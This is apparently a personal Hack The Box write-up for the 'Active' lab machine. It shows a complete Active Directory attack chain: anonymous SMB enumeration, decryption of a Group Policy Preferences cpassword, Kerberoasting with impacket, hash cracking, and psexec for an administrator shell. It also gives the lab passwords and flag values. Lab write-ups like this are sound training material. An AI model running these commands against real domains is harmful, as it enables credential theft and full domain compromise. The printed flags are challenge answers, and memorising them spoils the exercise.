# 📄 HTB: [Machine Name: Active]

## Challenge Details

Category: [[CyberSecurity]], [[Active Directory]], [[GPP Decryption]], [[Kerberoasting]]

Difficulty: Easy/Medium

Target: Active (IP: $target or 10.129.252.81)

Status: #solved

Date Completed: [[2025-11-23]]

Initial Credentials: N/A (Initial access gained via GPP exploit on SVC_TGS)

---

## 1. Initial Access & Foothold 🔑

Initial access was gained by exploiting publicly readable shares to find encrypted credentials in a Group Policy Preferences (GPP) file, then decrypting the password.

|**Detail**|**Value**|
|---|---|
|**Initial User Compromised**|`SVC_TGS`|
|**Initial Password**|`GPPstillStandingStrong2k18`|
|**Domain**|`active.htb`|
|**User Flag Location**|`C:\Users\SVC_TGS\Desktop\user.txt`|
|**User Flag**|`f66332fec8948b322777b5ec8320ff67`|

### Nmap and Host Discovery 🔎

Bash

```
# Full and service scan combined
nmap -p- -Pn $target -v --min-rate 1000 ...
```

#### Key Open Ports

|**PORT**|**SERVICE**|**VERSION**|**NOTES**|
|---|---|---|---|
|53/tcp|domain|Microsoft DNS|Domain: **active.htb**|
|88/tcp|kerberos-sec|MS Windows Kerberos|Active Directory KDC|
|**389/tcp**|ldap|MS Windows Active Directory LDAP|Domain: **active.htb**|
|**445/tcp**|microsoft-ds|Windows Server 2008 R2|**SMB** (Entry point)|

### Group Policy Preferences (GPP) Exploitation 💾

Anonymous access to the SMB share revealed potential sensitive files, specifically Group Policy XML files located in the `Replication` share.

Bash

```
# Enumerate shares anonymously
netexec smb $target -u '' -p '' --shares
# Key Share: Replication (Permissions: READ)

# Spider the readable shares and download files
netexec smb $target -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
# Key File Found: /Replication/active.htb/Policies/{...}/MACHINE/Preferences/Groups/Groups.xml

# Extract the Encrypted Password (cpassword)
grep -ri 'pass' /home/amuzed/.nxc/modules/nxc_spider_plus/
# Key Output: cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
# Account: active.htb\SVC_TGS

# Decrypt the cpassword using the known AES-256 key
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
# Decrypted Password: GPPstillStandingStrong2k18
```

### Retrieving the User Flag 🚩

The compromised credentials for **`SVC_TGS:GPPstillStandingStrong2k18`** were used to access the user's desktop via SMB to retrieve the user flag. Since the initial tool used was `impacket-psexec`, the user flag was found in the shell session.

Bash

```
# Verify SMB access
netexec smb $target -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
# Output: [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18

# Command used later that reveals user flag location:
# rlwrap impacket-psexec active.htb/SVC_TGS:GPPstillStandingStrong2k18@$target
# type C:\Users\SVC_TGS\Desktop\user.txt
# Output: f66332fec8948b322777b5ec8320ff67
```

---

## 2. Privilege Escalation 👑

Privilege escalation was achieved by authenticating as the new user (`SVC_TGS`) and exploiting the **Kerberoasting** attack vector against the domain's Service Principal Names (SPNs).

### Kerberoasting Attack 🏹

The `SVC_TGS` account was used to request a Kerberos Ticket Granting Service (TGS) ticket for any account that had an associated **SPN** (Service Principal Name) assigned, which typically includes service accounts and, in this case, the **Administrator** account.

Bash

```
# Request TGS ticket for accounts with SPNs, authenticating as SVC_TGS
impacket-GetUserSPNs -dc-ip $target 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -request
# Key Output: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b4fe6acdf9b03e34... (Hash)
```

### Hash Cracking and Root Access 💻

The harvested Kerberos TGS hash was cracked to reveal the Administrator's password.

Bash

```
# Crack the TGS hash with John
john hash --wordlist=/usr/share/wordlists/rockyou.txt
# Cracked Password: Ticketmaster1968
# Account: Administrator:Ticketmaster1968

# Authenticate as Administrator using psexec (or other remote execution methods)
rlwrap impacket-psexec active.htb/administrator:Ticketmaster1968@$target
# Key Output: C:\Users\Administrator\Desktop>

# Retrieve the Root Flag
C:\Users\Administrator\Desktop> type root.txt
# Output: 87525f514e6919cf206a105d635de8dd
```
